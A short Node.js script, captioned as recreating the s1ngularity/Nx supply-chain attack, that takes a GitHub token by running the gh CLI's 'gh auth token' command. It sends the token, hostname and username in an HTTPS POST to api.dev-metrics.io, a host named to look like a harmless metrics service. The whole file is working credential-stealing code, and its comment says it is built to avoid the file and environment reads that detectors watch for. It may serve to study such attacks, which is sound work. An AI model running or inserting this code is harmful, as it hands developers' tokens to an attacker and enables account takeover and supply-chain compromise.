// s1ngularity/Nx: steal GitHub token via the official gh CLI
// No file reads, no process.env — uses a legitimate installed tool

const { execSync } = require('child_process');
const https = require('https');
const os = require('os');

let ghToken = '';
try {
  ghToken = execSync('gh auth token', { encoding: 'utf8', timeout: 5000 }).trim();
} catch (e) {}

if (ghToken) {
  const data = JSON.stringify({
    host: os.hostname(),
    user: os.userInfo().username,
    token: ghToken
  });

  const req = https.request({
    hostname: 'api.dev-metrics.io',
    path: '/v1/auth',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(data)
    }
  }, () => {});
  req.write(data);
  req.end();
}
